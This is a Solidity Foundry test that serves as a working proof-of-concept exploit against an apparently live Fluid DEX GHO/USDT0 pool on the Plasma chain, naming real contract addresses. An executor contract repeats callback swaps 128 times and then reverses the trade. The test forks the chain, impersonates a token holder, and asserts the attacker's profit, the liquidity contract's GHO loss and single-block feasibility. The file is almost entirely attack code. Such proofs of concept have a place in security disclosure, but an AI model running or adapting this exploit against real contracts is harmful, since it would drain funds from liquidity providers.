// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.21;

import {Test} from "forge-std/Test.sol";

interface IERC20CallbackProof {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IFluidDexCallbackProof {
    function swapOutWithCallback(
        bool swap0to1,
        uint256 amountOut,
        uint256 amountInMax,
        address to
    ) external payable returns (uint256 amountIn);
}

contract PlasmaCallbackProofExecutor {
    address internal constant POOL = 0x080574D224E960c272e005aA03EFbe793f317640;
    address internal constant LIQUIDITY = 0x52Aa899454998Be5b000Ad077a46Bbe360F4e497;
    address internal constant GHO = 0xb77E872A68C62CfC0dFb02C067Ecc3DA23B4bbf3;
    address internal constant USDT0 = 0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb;

    function dexCallback(address token, uint256 amount) external {
        require(msg.sender == POOL, "CALLER_NOT_POOL");
        require(token == GHO || token == USDT0, "UNEXPECTED_TOKEN");
        require(IERC20CallbackProof(token).transfer(LIQUIDITY, amount), "CALLBACK_TRANSFER");
    }

    function cycle(uint256 rounds, uint256 ghoOutEach)
        external returns (uint256 totalUsdtInput, uint256 reverseGhoInput)
    {
        for (uint256 i; i < rounds; ++i) {
            totalUsdtInput += IFluidDexCallbackProof(POOL).swapOutWithCallback(
                false, ghoOutEach, type(uint256).max, address(this)
            );
        }
        reverseGhoInput = IFluidDexCallbackProof(POOL).swapOutWithCallback(
            true, totalUsdtInput, type(uint256).max, address(this)
        );
    }
}

contract PlasmaGhoUsdtCallbackNoSyntheticTest is Test {
    address internal constant LIQUIDITY = 0x52Aa899454998Be5b000Ad077a46Bbe360F4e497;
    address internal constant GHO = 0xb77E872A68C62CfC0dFb02C067Ecc3DA23B4bbf3;
    address internal constant USDT0 = 0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb;
    address internal constant LIVE_HOLDER = 0x8741B106e9738a6971AD07DABCFe95FF66337b51;

    uint256 internal constant FUNDING = 1_000_000;
    uint256 internal constant ROUNDS = 128;
    uint256 internal constant GHO_OUT_EACH = 256_100_000_000_001;
    uint256 internal constant TX_OVERHEAD = 50_000;

    event CallbackExistingFundsProof(
        uint256 rounds,
        uint256 ghoOutEach,
        uint256 totalUsdtInput,
        uint256 reverseGhoInput,
        uint256 attackerUsdtLoss,
        uint256 attackerGhoGain,
        uint256 liquidityGhoLoss,
        uint256 executionGas
    );

    function setUp() public {
        vm.createSelectFork(vm.envString("PLASMA_RPC_URL"), vm.envUint("PLASMA_FORK_BLOCK"));
        assertEq(block.chainid, 9745, "unexpected chain");
    }

    function test_callbackClosedCycle_existingUsdt_zeroGhoSeed() public {
        PlasmaCallbackProofExecutor executor = new PlasmaCallbackProofExecutor();
        assertEq(IERC20CallbackProof(USDT0).balanceOf(address(executor)), 0, "USDT seed");
        assertEq(IERC20CallbackProof(GHO).balanceOf(address(executor)), 0, "GHO seed");

        uint256 usdtSupplyBeforeFunding = IERC20CallbackProof(USDT0).totalSupply();
        vm.prank(LIVE_HOLDER);
        require(IERC20CallbackProof(USDT0).transfer(address(executor), FUNDING), "LIVE_TRANSFER");
        assertEq(IERC20CallbackProof(USDT0).totalSupply(), usdtSupplyBeforeFunding, "minted USDT");

        uint256 attackerUsdtBefore = IERC20CallbackProof(USDT0).balanceOf(address(executor));
        uint256 attackerGhoBefore = IERC20CallbackProof(GHO).balanceOf(address(executor));
        uint256 liquidityUsdtBefore = IERC20CallbackProof(USDT0).balanceOf(LIQUIDITY);
        uint256 liquidityGhoBefore = IERC20CallbackProof(GHO).balanceOf(LIQUIDITY);
        uint256 ghoSupplyBefore = IERC20CallbackProof(GHO).totalSupply();
        uint256 usdtSupplyBefore = IERC20CallbackProof(USDT0).totalSupply();

        uint256 gasBefore = gasleft();
        (uint256 totalUsdtInput, uint256 reverseGhoInput) = executor.cycle(ROUNDS, GHO_OUT_EACH);
        uint256 executionGas = gasBefore - gasleft();

        uint256 attackerUsdtLoss = attackerUsdtBefore - IERC20CallbackProof(USDT0).balanceOf(address(executor));
        uint256 attackerGhoGain = IERC20CallbackProof(GHO).balanceOf(address(executor)) - attackerGhoBefore;
        uint256 liquidityUsdtGain = IERC20CallbackProof(USDT0).balanceOf(LIQUIDITY) - liquidityUsdtBefore;
        uint256 liquidityGhoLoss = liquidityGhoBefore - IERC20CallbackProof(GHO).balanceOf(LIQUIDITY);

        assertEq(IERC20CallbackProof(GHO).totalSupply(), ghoSupplyBefore, "GHO supply changed");
        assertEq(IERC20CallbackProof(USDT0).totalSupply(), usdtSupplyBefore, "USDT supply changed");
        assertEq(attackerUsdtLoss, liquidityUsdtGain, "USDT accounting mismatch");
        assertEq(attackerGhoGain, liquidityGhoLoss, "GHO accounting mismatch");
        assertGt(attackerGhoGain, attackerUsdtLoss * 1e12, "not parity-positive");
        assertLt(executionGas + TX_OVERHEAD, block.gaslimit, "not one-block executable");

        emit CallbackExistingFundsProof(
            ROUNDS,
            GHO_OUT_EACH,
            totalUsdtInput,
            reverseGhoInput,
            attackerUsdtLoss,
            attackerGhoGain,
            liquidityGhoLoss,
            executionGas
        );
    }
}
